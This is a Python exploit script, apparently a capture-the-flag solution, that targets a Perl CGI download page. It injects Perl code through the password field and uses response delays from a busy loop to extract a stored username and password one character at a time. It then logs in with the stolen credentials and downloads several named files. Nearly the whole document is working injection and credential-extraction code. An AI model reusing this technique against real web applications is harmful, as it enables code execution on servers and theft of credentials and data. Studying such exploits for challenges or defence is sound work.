#!/usr/bin/python

# You might need to adjust some values depending on your server performance and
# the url to access the website.See comments in code below.

# This solution uses a binary search. Probably not the fastest way to do it but
# limits the number of requests. In fact, it is not necessary to recover the
# hash as we can trick perl to pass it directly. Anyway, we can get everything!

from __future__ import print_function

import time
import urllib
import urllib2

# Adjust the url
url = "http://localhost/CGI/DOWNLOAD.PL"

def query(idx, val, result=''):
    cond = r'''(ord(substr($t, {}))<={})'''.format(idx, val)
    if result:
        cond += r''' and (substr($t, 0, {}) eq "{}")'''.format(len(result), result)

    q = urllib.urlencode({
        'PASSWORD':(
            r''');my $t=join(':', @$_);$t.="\n";if('''
            + cond
            # adjust the number of iteration to modify server delay (3*10**6)
            + r'''){$a='';for($i=0;$i<4*10**6;$i++){$a.='a';};};('''
        ),
        'USER':'',
        'NAME':'hackers',
    })
    data = urllib2.urlopen("{url}?{query}".format(url=url, query=q)).read()
    return data

def is_equal_or_less(idx, val, result):
    start = time.time() 
    query(idx, val, result)
    elapsed = time.time()
    # adjust the threshold between normal responses (no match) and delayed
    # responses (match)
    return (elapsed - start) > 0.4

def binary_search(_min, _max, is_equal_or_less):
    while _min != _max:
        val = (_min + _max) // 2
        if is_equal_or_less(val):
            if val == _min:
                return _min
            _max = val
        elif _max == val + 1:
            return _max
        else:
            _min = val + 1
    return _min

result = ''
c = ''
idx = 0

while c != '\n':
    c = chr(binary_search(0, 127, lambda val: is_equal_or_less(idx, val, result)))
    result += c
    idx += 1
    print("{}: {}".format(idx, result))

print(result)

user, password = result.strip().split(':')

for name in ('SWORDFISH', 'HACKERS', 'MATRIX', 'WARGAMES'):
    q = urllib.urlencode({
        'PASSWORD':'),("{}"'.format(password),
        'USER':user,
        'NAME':name,
    })

    req = "{url}?{query}".format(url=url, query=q)
    data = urllib2.urlopen(req).read()
    print(data)
